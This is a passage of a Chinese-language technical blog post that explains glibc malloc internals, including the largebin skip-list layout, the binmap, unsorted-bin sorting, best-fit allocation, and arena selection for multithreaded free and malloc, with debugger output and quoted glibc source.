<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">largebins</span><br><span class="line">0x400-0x430: 0x55555555dba0 —▸ 0x55555555dfe0 —▸ 0x55555555d340 —▸ 0x55555555d770 —▸ 0x55555555cb00 —▸ 0x55555555cf20 —▸ 0x7ffff7fa70d0 (main_arena+1104) ◂— 0x55555555dba0</span><br><span class="line">pwndbg&gt; x/6gx 0x55555555dba0</span><br><span class="line">0x55555555dba0: 0x0000000000000000      0x0000000000000421</span><br><span class="line">0x55555555dbb0: 0x000055555555dfe0      0x00007ffff7fa70d0</span><br><span class="line">0x55555555dbc0: 0x000055555555d340      0x000055555555cb00</span><br><span class="line">pwndbg&gt; x/6gx 0x55555555dfe0</span><br><span class="line">0x55555555dfe0: 0x0000000000000000      0x0000000000000421</span><br><span class="line">0x55555555dff0: 0x000055555555d340      0x000055555555dba0</span><br><span class="line">0x55555555e000: 0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/6gx 0x55555555d340</span><br><span class="line">0x55555555d340: 0x0000000000000000      0x0000000000000411</span><br><span class="line">0x55555555d350: 0x000055555555d770      0x000055555555dfe0</span><br><span class="line">0x55555555d360: 0x000055555555cb00      0x000055555555dba0</span><br><span class="line">pwndbg&gt; x/6gx 0x55555555d770</span><br><span class="line">0x55555555d770: 0x0000000000000000      0x0000000000000411</span><br><span class="line">0x55555555d780: 0x000055555555cb00      0x000055555555d340</span><br><span class="line">0x55555555d790: 0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/6gx 0x55555555cb00</span><br><span class="line">0x55555555cb00: 0x0000000000000000      0x0000000000000401</span><br><span class="line">0x55555555cb10: 0x000055555555cf20      0x000055555555d770</span><br><span class="line">0x55555555cb20: 0x000055555555dba0      0x000055555555d340</span><br><span class="line">pwndbg&gt; x/6gx 0x55555555cf20</span><br><span class="line">0x55555555cf20: 0x0000000000000000      0x0000000000000401</span><br><span class="line">0x55555555cf30: 0x00007ffff7fa70d0      0x000055555555cb00</span><br><span class="line">0x55555555cf40: 0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/2gx 0x7ffff7fa70d0+0x10</span><br><span class="line">0x7ffff7fa70e0 &lt;main_arena+1120&gt;:       0x000055555555dba0      0x000055555555cf20</span><br></pre></td></tr></table></figure>
<p>那么画到图上长这逼样</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241030144119554.png"
alt="image-20241030144119554" />
<figcaption aria-hidden="true">image-20241030144119554</figcaption>
</figure>
<table>
<thead>
<tr>
<th>线条颜色</th>
<th>指针</th>
</tr>
</thead>
<tbody>
<tr>
<td>蓝</td>
<td>fd</td>
</tr>
<tr>
<td>绿</td>
<td>bk</td>
</tr>
<tr>
<td>粉</td>
<td>fd_nextsize</td>
</tr>
<tr>
<td>黄</td>
<td>bk_nextsize</td>
</tr>
</tbody>
</table>
<p><strong>实际上largebin可以看作双向链表, 又加上了跳表索引</strong></p>
<h5 id="双向链表">双向链表</h5>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241030145225118.png"
alt="双向链表" />
<figcaption aria-hidden="true">双向链表</figcaption>
</figure>
<h5 id="跳表索引">跳表索引</h5>
<p>附加头节点<code>bin_at(M,idx)</code>只有<code>fd</code>和<code>bk</code>指针,没有<code>fd_nextsize</code>和<code>bk_nextsize</code>跳表索引</p>
<p>所有堆块首先按照大小降序排列成双向链表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[0x421]-&gt;[0x421]-&gt;[0x411]-&gt;[0x411]-&gt;[0x401]-&gt;[0x401]</span><br></pre></td></tr></table></figure>
<p>只在相同大小的堆块簇的<strong>首个堆块</strong>上建立<strong>跳表索引</strong>,指向<strong>下一个大小不同的堆块簇</strong></p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241030145332777.png"
alt="跳表索引" />
<figcaption aria-hidden="true">跳表索引</figcaption>
</figure>
<h5 id="链表跳表">链表+跳表</h5>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241030150204350.png"
alt="image-20241030150204350" />
<figcaption aria-hidden="true">image-20241030150204350</figcaption>
</figure>
<h5 id="binmap">binmap</h5>
<p><code>binmap</code>用于在<code>largebin</code>的中加速查找更大的非空的<code>bin</code></p>
<p><code>binmap</code>
是<code>malloc_state</code>的成员,<code>4</code>个<code>int</code>,实际上就是一个<code>128</code>位的位向量</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line"><span class="comment">//unsigned int binmap[4];</span></span><br></pre></td></tr></table></figure>
<p><code>i</code>
就是根据堆块大小落到的<code>largebin</code>下标<code>idx</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> mark_bin(m, i)    ((m)-&gt;binmap[idx2block (i)] |= idx2bit (i))		<span class="comment">//标记下标为i的桶子中有至少一个堆块</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unmark_bin(m, i)  ((m)-&gt;binmap[idx2block (i)] &amp;= ~(idx2bit (i)))	<span class="comment">//标记下标为i的桶子中一个堆块也没有</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> get_binmap(m, i)  ((m)-&gt;binmap[idx2block (i)] &amp; idx2bit (i))		<span class="comment">//查看下标为i的桶子中有没有堆块</span></span></span><br></pre></td></tr></table></figure>
<p>比如</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mark_bin(m,63) </span><br><span class="line">	binmap[63&gt;&gt;5] |= ((1U &lt;&lt; ((63) &amp; ((1U &lt;&lt; 5) - 1))))</span><br><span class="line">	binmap[1] |= (1&lt;&lt;31)</span><br><span class="line">	</span><br><span class="line">mark_bin(m,64)</span><br><span class="line">	binmap[2] |= (1&lt;&lt;0)</span><br></pre></td></tr></table></figure>
<p>也就是对于<code>largebin</code>来说,<code>binmap[0]</code>永远用不到</p>
<h4 id="algorithm-4">algorithm</h4>
<p><code>largebin</code>中的堆块,只能是来自于<code>unsortedbin</code></p>
<p>如果某次<code>malloc</code>没有从<code>tcache,fastbins,smallbins</code>,中得到想要的堆块</p>
<p>此时需要遍历<code>unsortedbin</code>,整理其中的所有堆块,归类到<code>smallbins</code>或者<code>largebins</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//unsortedbin整理算法:</span></span><br><span class="line"></span><br><span class="line">如果unsortedbin只有last_remainder并且他能满足分配需求</span><br><span class="line">	那么从last_remainder头部切出需求,剩下的继续作为last_remainder,然后返回</span><br><span class="line"></span><br><span class="line">否则 将unsorted上的这块先拿下来</span><br><span class="line">	如果这块的大小正好等于需求</span><br><span class="line">		如果tcache不满则先搬到tcache并记下tcache可以满足,<span class="keyword">continue</span>, 在整理完所有unsortedbin之后再返回, 整理过程中如果tcache满了也会返回</span><br><span class="line">		否则tcache满则直接返回</span><br><span class="line">	否则</span><br><span class="line">		如果这块在smallbin范围内就放到smallbin</span><br><span class="line">		否则这块在largebin范围内就放到largebin</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>将<code>unsortedbin</code>堆块放到<code>smallbins</code>中时非常简单,因为<code>smallbins</code>中的堆块大小和桶子下标有严格的关系,根据堆块大小计算出下标,头插法一塞就完了</p>
<p><strong>但是往<code>largebin</code>放时,一个<code>bin</code>里面可能会有不同大小的堆块,需要先通过跳表索引进行插入排序</strong></p>
<h5 id="插入更小的堆块">插入更小的堆块</h5>
<p>假设现在<code>bin_at(M,63)</code>中已经有<code>0x421,0x411</code>的跳表索引</p>
<p>又要将一个<code>0x401</code>的堆块放进去</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241101203700160.png"
alt="image-20241101203700160" />
<figcaption aria-hidden="true">image-20241101203700160</figcaption>
</figure>
<h5 id="插入已有索引的堆块">插入已有索引的堆块</h5>
<p>假设现在<code>bin_at(M,63)</code>中已经有<code>0x421,0x411,0x401</code>的跳表索引</p>
<p>又要将一个<code>0x411</code>的堆块放进去,那么过程将会是这样的:</p>
<p>0.计算得知<code>0x411</code>落在<code>bin_at(M,63)</code>范围</p>
<p>1.与<code>bin_at(M,63)-&gt;bk</code>,也就是这个<code>bin</code>里最小的堆块,也就是一个<code>0x401</code>的堆块进行比较,发现新放入的堆块<strong>不是最小的</strong>,不能直接放到<code>bin_at(M,63)-&gt;bk</code>上,需要从大到小遍历这个<code>bin</code>,进行<strong>插入排序</strong></p>
<p>2.从<code>bin_at(M,63)-&gt;fd</code>,有就是这个<code>bin</code>里最大的堆块,也就是与<code>0x421</code>开始比较,发现新放入的堆块比他小</p>
<p>3.利用<code>0x421</code>
上的跳表索引,找到了<code>0x411</code>的,新堆块可以放到这里了</p>
<p>4.保持跳表索引堆块不变,在其<code>fd</code>上插入新堆块</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241030153014682.png"
alt="image-20241030153014682" />
<figcaption aria-hidden="true">image-20241030153014682</figcaption>
</figure>
<h5 id="插入不存在索引的堆块">插入不存在索引的堆块</h5>
<p>假设现在<code>bin_at(M,63)</code>中已经有<code>0x421,0x401</code>的跳表索引</p>
<p>又要将一个<code>0x411</code>的堆块放进去,那么过程将会是这样的:</p>
<h5 id="当前bin中有堆块时拿走一个">当前bin中有堆块时拿走一个</h5>
<p><code>largebin</code>
在拿走堆块时采用最佳适配策略,也就是说尽量找一个最小的堆块满足分配需求</p>
<p>首先计算得到<code>bin_at(M,idx)</code></p>
<p>然后通过<code>fd</code>链表找到该<code>bin</code>中最大的块</p>
<p>如果最大的块都无法满足需求,则使用<code>largebin</code>显然无法满足需求,没必要在<code>largebin</code>这里浪费时间了</p>
<p>否则本<code>bin</code>中必然存在能够满足需求的块,起码最大的块肯定可以,但是直接用这个最大块太亏,切割最大块之后造成外部碎片的可能性更大,因此接下来需要找到最佳适配的临界块</p>
<p>利用最大块的<code>bk_nextsize</code>索引跳到最小块上,然后再沿着<code>bk_nextsize</code>向更大块遍历,如此寻找最佳适配</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241030155542420.png"
alt="image-20241030155542420" />
<figcaption aria-hidden="true">image-20241030155542420</figcaption>
</figure>
<p>找到最佳适配后,首先尝试拿走普通堆块,没有普通堆块再拿走索引堆块,</p>
<p>然后在这个堆块上切割出分配需求来,</p>
<p>如果剩余的下脚料太小了,小于<code>0x20</code>字节,就不抠搜了,整个普通节点全都返回,就当送人了</p>
<p>如果剩余的下脚料还行,大于等于<code>0x20</code>,那么就把下脚料扔给<code>unsortedbin</code></p>
<h5 id="当前bin中没有堆块时拿走一个">当前bin中没有堆块时拿走一个</h5>
<p>首先根据堆块大小计算出<code>idx</code></p>
<p>发现<code>idx</code>对应的<code>largebin</code>中没有堆块</p>
<p>于是沿着<code>idx++</code>的方向,向更大的<code>bin</code>中寻找目标</p>
<p>这个寻找的过程使用了<code>binmap</code>加速</p>
<p>整个<code>binmap</code>分为四个<code>block</code>,
对应到四个<code>int</code></p>
<p>根据当前<code>bin</code>的下标<code>idx</code>计算出所属的<code>block</code></p>
<p>如果<code>binmap[block] &gt; idx2bit(idx)</code></p>
<p>这就说明<code>idx</code>所属的块中,<strong>可能</strong>存在更大的<code>bin</code>,其中有堆块</p>
<p>找到这个更大的<code>bin</code>,实际判断一下其中到底有没有堆块</p>
<p>从这个大<code>bin</code>中拿出一块切割,返回</p>
<p>切剩下的如果很小则一并返回了</p>
<p>否则放到<code>unsortedbin</code></p>
<h2 id="多线程场景">多线程场景</h2>
<h3 id="free-2">free</h3>
<p>在通常情况下,堆区的申请和释放只会使用到主分配区<code>main_arena</code>,在多线程等情况下可能存在多个分配区,但是我们依然只管<code>malloc</code>和<code>free</code>,并没有指定从哪个分配区申请或者释放堆块</p>
<p>首先说释放:</p>
<p>实际上是<code>libc_free</code>决定了往哪里释放</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __libc_free(<span class="type">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">    mstate ar_ptr;</span><br><span class="line">    mchunkptr p; <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mem == <span class="number">0</span>) <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    p = mem2chunk(mem);</span><br><span class="line">    <span class="comment">//对于mmap申请的堆块,使用munmap倒回去</span></span><br><span class="line">    <span class="keyword">if</span> (chunk_is_mmapped(p)) <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">    &#123;</span><br><span class="line">        ...</span><br><span class="line">        munmap_chunk(p);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;       <span class="comment">//从分配区来的堆块,还给分配区</span></span><br><span class="line">        MAYBE_INIT_TCACHE();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Mark the chunk as belonging to the library again.  */</span></span><br><span class="line">        (<span class="type">void</span>)tag_region(chunk2mem(p), memsize(p));</span><br><span class="line"></span><br><span class="line">        ar_ptr = arena_for_chunk(p);</span><br><span class="line">        _int_free(ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在调用<code>_int_free</code>时传递了分配区指针<code>ar_ptr</code>,他是这样计算的:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ar_ptr = arena_for_chunk(p);</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> malloc_state *</span><br><span class="line"><span class="title function_">arena_for_chunk</span> <span class="params">(mchunkptr ptr)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> chunk_main_arena (ptr) ? &amp;main_arena : heap_for_ptr (ptr)-&gt;ar_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里<code>chunk_main_arena(ptr)</code>会检查堆块的A标志位,对于来自非主分配区的堆块,会调用<code>heap_for_ptr</code>计算其所在分配区</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> heap_info *</span><br><span class="line"><span class="title function_">heap_for_ptr</span> <span class="params">(<span class="type">void</span> *ptr)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> max_size = heap_max_size ();</span><br><span class="line">  <span class="keyword">return</span> PTR_ALIGN_DOWN (ptr, max_size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这干了个啥事呢?</p>
<p><code>max_size</code>实际上是<code>64M</code>,然后<code>ptr</code>向下对齐到<code>64M</code>,是什么一个效果呢?</p>
<p><code>ptr &amp; 0xfffffffffc000000</code></p>
<p>比如假设<code>ptr = 0x555558026520</code></p>
<p>那么此时<code>ptr &amp; 0xfffffffffc000000 = 0x555558026520 &amp; 0xfffffffffc000000 = 0x555558000000</code></p>
<p>这个值就被认为是<code>ptr</code>所在的分配区描述符<code>heap_info</code>的位置</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">type = <span class="keyword">struct</span> _heap_info &#123;</span><br><span class="line"><span class="comment">/* 0x0000      |  0x0008 */</span>    mstate ar_ptr;</span><br><span class="line"><span class="comment">/* 0x0008      |  0x0008 */</span>    <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span> *<span class="title">prev</span>;</span></span><br><span class="line"><span class="comment">/* 0x0010      |  0x0008 */</span>    <span class="type">size_t</span> size;</span><br><span class="line"><span class="comment">/* 0x0018      |  0x0008 */</span>    <span class="type">size_t</span> mprotect_size;</span><br><span class="line"><span class="comment">/* 0x0020      |  0x0008 */</span>    <span class="type">size_t</span> pagesize;</span><br><span class="line"><span class="comment">/* 0x0028      |  0x0008 */</span>    <span class="type">char</span> pad[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line">                               <span class="comment">/* total size (bytes):   48 */</span></span><br><span class="line">                             &#125;</span><br></pre></td></tr></table></figure>
<p>然后其中的<code>ar_ptr</code>就是分配区<code>malloc_state</code>指针</p>
<p>也就是说, 对于一个堆块p</p>
<p>如果其有标志位A,那么直接使用<code>glibc</code>中的<code>main_arena</code>指针返回主分配区</p>
<p>如果其无标志位A,那么首先将其地址向下对齐到<code>64M</code>得到<code>heap_info</code>的位置,然后得到<code>ar_ptr</code>的位置</p>
<h3 id="malloc-3">malloc</h3>
<p>如果只有一个线程显然不需要建立多个分配区,因为控制流同一时间只能有一个分配请求</p>
<p>那么对于多线程环境,首先如何界定多线程呢?</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> __ASSEMBLER__</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> __libc_multiple_threads;</span><br><span class="line">libc_hidden_proto (__libc_multiple_threads)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> !defined SINGLE_THREAD_BY_GLOBAL || IS_IN (rtld)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> SINGLE_THREAD_P \</span></span><br><span class="line"><span class="meta">  (THREAD_GETMEM (THREAD_SELF, header.multiple_threads) == 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> SINGLE_THREAD_P (__libc_multiple_threads == 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RTLD_SINGLE_THREAD_P SINGLE_THREAD_P</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* _SINGLE_THREAD_H  */</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>如果TCB中有定义multiple_threads字段,则检查该字段是否为1</p>
<p>否则检查glibc的<code>__libc_multiple_threads</code>变量是否为1</p>
<p>在x86上使用前者</p>
<p>这个多线程字段会指导malloc的行为</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (SINGLE_THREAD_P)		<span class="comment">//单线程时的行为</span></span><br><span class="line">   &#123;</span><br><span class="line">     victim = tag_new_usable (_int_malloc (&amp;main_arena, bytes));</span><br><span class="line">     assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">      &amp;main_arena == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">     <span class="keyword">return</span> victim;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="comment">//下为多线程时行为</span></span><br><span class="line"> arena_get (ar_ptr, bytes);	</span><br><span class="line"></span><br><span class="line"> victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line"> <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">    before.  */</span></span><br><span class="line"> <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">   &#123;</span><br><span class="line">     LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">     ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">     victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">   __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line"> victim = tag_new_usable (victim);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在多线程场景下</p>
<p>首先尝试<code>arena_get(ar_ptr = NULL,bytes)</code>拿到一个分配区</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#define arena_get(ptr, size) do &#123; \</span><br><span class="line">      ptr = thread_arena;						      \</span><br><span class="line">      arena_lock (ptr, size);						      \</span><br><span class="line">  &#125; while (0)</span><br><span class="line"></span><br><span class="line">#define arena_lock(ptr, size) do &#123;					      \</span><br><span class="line">      if (ptr)								      \</span><br><span class="line">        __libc_lock_lock (ptr-&gt;mutex);					      \</span><br><span class="line">      else								      \</span><br><span class="line">        ptr = arena_get2 ((size), NULL);				      \</span><br><span class="line">  &#125; while (0)</span><br></pre></td></tr></table></figure>
<p>主线程会有<code>thread_arena = &amp;main_arena</code></p>
<p>对于其他线程,第一次尝试分配时,<code>thread_arena = NULL</code></p>
<p>此时会调用<code>arena_get2</code>,这个函数会尝试找一个当前空闲的分配区,如果有则返回</p>
<p>如果没有会尝试新创建一个分配区,如果已经达到了分配区数量上限,只能等着</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">static</span> mstate</span><br><span class="line"><span class="title function_">arena_get2</span> <span class="params">(<span class="type">size_t</span> size, mstate avoid_arena)</span></span><br><span class="line">&#123;</span><br><span class="line">  mstate a;</span><br><span class="line"></span><br><span class="line">  <span class="type">static</span> <span class="type">size_t</span> narenas_limit;</span><br><span class="line"></span><br><span class="line">  a = get_free_list ();	<span class="comment">//尝试从freelist上拿一个分配区</span></span><br><span class="line">  <span class="keyword">if</span> (a == <span class="literal">NULL</span>)  <span class="comment">//如果a == NULL说明当前没有空闲的分配区</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Nothing immediately available, so generate a new arena.  */</span></span><br><span class="line">      <span class="keyword">if</span> (narenas_limit == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (mp_.arena_max != <span class="number">0</span>) <span class="comment">//如果分配区数量有明确配置的上限</span></span><br><span class="line">            narenas_limit = mp_.arena_max;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> (narenas &gt; mp_.arena_test)<span class="comment">//否则</span></span><br><span class="line">            &#123;</span><br><span class="line">              <span class="type">int</span> n = __get_nprocs_sched ();<span class="comment">//获取能够使用的CPU核心数</span></span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span> (n &gt;= <span class="number">1</span>)</span><br><span class="line">                narenas_limit = NARENAS_FROM_NCORES (n);<span class="comment">//在x86_64上最多是8*n</span></span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                <span class="comment">/* We have no information about the system.  Assume two</span></span><br><span class="line"><span class="comment">                   cores.  */</span></span><br><span class="line">                narenas_limit = NARENAS_FROM_NCORES (<span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    repeat:;</span><br><span class="line">      <span class="type">size_t</span> n = narenas;</span><br><span class="line">      <span class="comment">/* NB: the following depends on the fact that (size_t)0 - 1 is a</span></span><br><span class="line"><span class="comment">         very large number and that the underflow is OK.  If arena_max</span></span><br><span class="line"><span class="comment">         is set the value of arena_test is irrelevant.  If arena_test</span></span><br><span class="line"><span class="comment">         is set but narenas is not yet larger or equal to arena_test</span></span><br><span class="line"><span class="comment">         narenas_limit is 0.  There is no possibility for narenas to</span></span><br><span class="line"><span class="comment">         be too big for the test to always fail since there is not</span></span><br><span class="line"><span class="comment">         enough address space to create that many arenas.  */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (n &lt;= narenas_limit - <span class="number">1</span>))  <span class="comment">//还能创建新的分配区</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (catomic_compare_and_exchange_bool_acq (&amp;narenas, n + <span class="number">1</span>, n))</span><br><span class="line">            <span class="keyword">goto</span> repeat;</span><br><span class="line">          a = _int_new_arena (size);    <span class="comment">//创建新分配区</span></span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (a == <span class="literal">NULL</span>))</span><br><span class="line">            catomic_decrement (&amp;narenas);</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span>    <span class="comment">//无法创建新分配区,此时只能轮询已有的分配区等待</span></span><br><span class="line">        a = reused_arena (avoid_arena); </span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里<code>freelist</code>用于在多线程场景下,保存当前空闲的分配区</p>
<p>分配区<code>malloc_state</code>中有一个<code>next_free</code>就是单链表后继指针</p>
